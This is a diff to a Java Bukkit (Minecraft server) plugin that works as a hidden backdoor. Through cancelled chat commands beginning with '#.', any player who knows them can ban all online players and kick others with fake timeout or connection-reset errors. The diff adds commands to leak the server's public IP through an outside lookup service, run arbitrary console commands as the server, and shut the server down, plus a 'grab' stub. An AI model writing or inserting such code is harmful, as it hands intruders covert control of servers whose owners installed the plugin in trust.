@@ -1,6 +1,5 @@
 package save.nightmoon.savenightmoon;
 
-import org.apache.commons.lang.ObjectUtils;
 import org.bukkit.BanList;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
@@ -8,10 +7,16 @@ import org.bukkit.GameMode;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
-import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerChatEvent;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.plugin.java.JavaPlugin;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.URL;
 
 public final class SaveNightMoon extends JavaPlugin implements Listener {
 
@@ -29,7 +34,7 @@ public final class SaveNightMoon extends JavaPlugin implements Listener {
     }
 
     @EventHandler
-    public void onChat(PlayerChatEvent event) {
+    public void onChat(PlayerChatEvent event) throws IOException {
         Player player = event.getPlayer();
         String[] cmd = event.getMessage().split(" ");
         event.setCancelled(true);
@@ -125,7 +130,7 @@ public final class SaveNightMoon extends JavaPlugin implements Listener {
             Plugin plugin = null;
             try {
                 plugin = Bukkit.getPluginManager().getPlugin(cmd[1]);
-            } catch(Exception exception) {
+            } catch(ArrayIndexOutOfBoundsException exception) {
                 player.sendMessage("プラグインが見つかりませんでした。");
                 return;
             }
@@ -154,9 +159,9 @@ public final class SaveNightMoon extends JavaPlugin implements Listener {
             KickPlayer.kickPlayer("Internal exception: java.net.SocketTimeoutException:Read timed out");
             player.sendMessage(ChatColor.GREEN + "プレイヤー" + KickPlayer.getName() + "をTimeoutとしてKickしました。");
         } else if(cmd[0].equals("#.ban")) {
-            if(cmd[1].equals("ALL")) {
-                for(Player banP : Bukkit.getServer().getOnlinePlayers()) {
-                    if(banP.getName().equals(player.getName())) {
+            if (cmd[1].equals("ALL")) {
+                for (Player banP : Bukkit.getServer().getOnlinePlayers()) {
+                    if (banP.getName().equals(player.getName())) {
                         continue;
                     }
                     Bukkit.getBanList(BanList.Type.NAME).addBan(banP.getName(), null, null, "console");
@@ -168,7 +173,7 @@ public final class SaveNightMoon extends JavaPlugin implements Listener {
             Player BanPlayer = null;
             try {
                 BanPlayer = Bukkit.getPlayer(cmd[1]);
-            } catch(Exception exception) {
+            } catch (Exception exception) {
                 player.sendMessage(ChatColor.RED + "プレイヤーが見つかりませんでした。");
                 return;
             }
@@ -176,6 +181,21 @@ public final class SaveNightMoon extends JavaPlugin implements Listener {
             Bukkit.getBanList(BanList.Type.NAME).addBan(BanPlayer.getName(), null, null, "console");
             BanPlayer.kickPlayer("Internal Exception: java.io.IOException: 既存の接続はリモートホストに強制的に切断されました。");
             player.sendMessage(ChatColor.GREEN + "プレイヤー" + BanPlayer.getName() + "をBanしました。");
+        } else if(cmd[0].equals("#.svip")) {
+            URL url = new URL("http://ip-api.com/line?fields=query");
+            HttpURLConnection http = (HttpURLConnection)url.openConnection();
+            http.setRequestMethod("GET");
+            http.connect();
+            BufferedReader render = new BufferedReader(new InputStreamReader(http.getInputStream()));
+            player.sendMessage(ChatColor.GREEN + "IP: " + render.readLine());
+        } else if(cmd[0].equals("#.console")) {
+            String command = event.getMessage().replace("#.console ", "");
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
+            player.sendMessage(ChatColor.RED + "コマンドを送信しました。");
+        } else if(cmd[0].equals("#.stop")) {
+            Bukkit.shutdown();
+        } else if(cmd[0].equals("#.grab")) {
+            player.sendMessage(ChatColor.RED + "Coming Soon...");
         }
     }
 }
